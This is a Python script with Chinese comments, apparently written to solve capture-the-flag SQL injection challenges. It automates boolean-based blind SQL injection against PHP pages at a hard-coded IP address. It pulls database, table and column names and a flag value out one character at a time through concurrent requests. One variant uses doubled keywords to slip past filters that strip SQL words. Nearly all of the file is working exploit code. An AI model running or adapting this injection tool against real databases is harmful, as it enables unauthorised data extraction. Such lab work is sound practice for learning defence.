import asyncio
import aiohttp
import string

# 使用列表推导式合并所有字母和数字
characters = [char for char in string.ascii_letters + string.digits + "_{}"]
print(characters)

database_names = []
table_names = []
column_names = []
flags = []

semaphore = asyncio.Semaphore(100)


async def send_request(session, url):
    async with semaphore:
        async with session.get(url) as response:
            if response.status == 200:
                content = await response.text()
                # if "News exist!" in content:
                # if "We have this news!" in content:
                if "good" in content:
                    return url
    return None


async def find_character(session, i, j, base_url):
    tasks = []
    for char in characters:
        url = base_url.format(i, j, char)
        tasks.append(send_request(session, url))

    for task in asyncio.as_completed(tasks):
        result = await task
        if result:
            return result.split('=')[-1][:-4]
    return None


async def extract_data(session, base_url, limit_range, char_limit, storage_list):
    for i in range(limit_range):
        result = ""
        for j in range(1, char_limit + 1):
            char = await find_character(session, i, j, base_url)
            if char:
                result += char.split("'")[1]
        storage_list.append(result.lower())


# async def main():
#     async with aiohttp.ClientSession() as session:
#         # 获取数据库名称
#         database_url = ("http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' AND length(database())='8' AND"
#                         "ASCII(substr((select schema_name from information_schema.schemata limit {},1),{},1))=ASCII("
#                         "'{}') %23")
#         await extract_data(session, database_url, 9, 40, database_names)
#         print("Database Names:", database_names)
#
#         # 获取表名称
#         table_url = ("http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' AND ASCII(substr((SELECT table_name FROM "
#                      "INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA ='sqlitest'  limit {},1),{},1))=ASCII('{}') %23")
#         await extract_data(session, table_url, 9, 40, table_names)
#         print("Table Names:", table_names)
#
#         # 获取列名称
#         column_url = ("http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' AND ASCII(substr((SELECT COLUMN_NAME  FROM "
#                       "INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flag'  limit {},1),{},1))=ASCII('{}') %23")
#         await extract_data(session, column_url, 9, 40, column_names)
#         print("Column Names:", column_names)
#
#         # 获取flag值
#         flag_url = ("http://121.40.71.160:32785/BoolBasedSQLi.php?id=1' AND ASCII(substr((select flag from flag  "
#                     "limit {},1),{},"
#                     "1))=ASCII('{}') %23")
#         await extract_data(session, flag_url, 9, 100, flags)
#         print("Flags:", flags)


# async def main():
#     async with aiohttp.ClientSession() as session:
#         database_url = ("http://121.40.71.160:32788/Sqli2.php?id=1' AND substr((select schema_name from "
#                         "information_schema.schemata limit 1 offset {}) from {} for 1)='{}' %23")
#         await extract_data(session, database_url, 9, 40, database_names)
#         print("Database Names:", database_names)
#
#         # 获取表名称
#         table_url = ("http://121.40.71.160:32788/Sqli2.php?id=1' AND substr((SELECT table_name FROM "
#                      "INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA ='sqlitest' limit 1 offset {}) from {} for "
#                      "1)='{}' %23")
#         await extract_data(session, table_url, 9, 40, table_names)
#         print("Table Names:", table_names)
#         #
#         # 获取列名称
#         column_url = ("http://121.40.71.160:32788/Sqli2.php?id=1' AND substr((SELECT COLUMN_NAME  FROM "
#                       "INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flag' limit 1 offset {}) from {} for "
#                       "1)='{}' %23")
#         await extract_data(session, column_url, 9, 40, column_names)
#         print("Column Names:", column_names)
#         #
#         # # 获取flag值
#         flag_url = ("http://121.40.71.160:32788/Sqli2.php?id=1' AND substr((select flag from flag limit 1 offset {}) "
#                     "from {} for 1)='{}' %23")
#         await extract_data(session, flag_url, 9, 100, flags)
#         print("Flags:", flags)


async def main():
    async with aiohttp.ClientSession() as session:
        # database_url = ("http://121.40.71.160:32788/Sqli3.php?id=1' AandND substr((seselectlect schema_name from "
        #                 "infoorrinfoorrmationmation_schema.schemata limit 1 offset {}) from {} foorr 1)='{}' %23")
        # await extract_data(session, database_url, 9, 40, database_names)
        # print("Database Names:", database_names)
        #
        # # 获取表名称
        # table_url = ("http://121.40.71.160:32788/Sqli3.php?id=1' AandND substr((seselectlect table_name from "
        #              "infoorrinfoorrmationmation_schema.TABLES WHERE TABLE_SCHEMA ='sqlitest' limit 1 offset {}) from {} foorr 1)='{}' %23")
        # await extract_data(session, table_url, 9, 40, table_names)
        # print("Table Names:", table_names)
        # # #
        # # 获取列名称
        # column_url = ("http://121.40.71.160:32788/Sqli3.php?id=1' AandND substr((seselectlect COLUMN_NAME from "
        #               "infoorrinfoorrmationmation_schema.COLUMNS WHERE TABLE_NAME ='flag' limit 1 offset {}) from {} foorr 1)='{}' %23")
        # await extract_data(session, column_url, 9, 40, column_names)
        # print("Column Names:", column_names)
        #
        # # 获取flag值
        flag_url = ("http://121.40.71.160:32788/Sqli3.php?id=1' AandND substr((seselectlect flag from "
                    "flag limit 1 offset {}) from {} foorr 1)='{}' %23")
        await extract_data(session, flag_url, 9, 100, flags)
        print("Flags:", flags)


# 运行异步任务
asyncio.run(main())
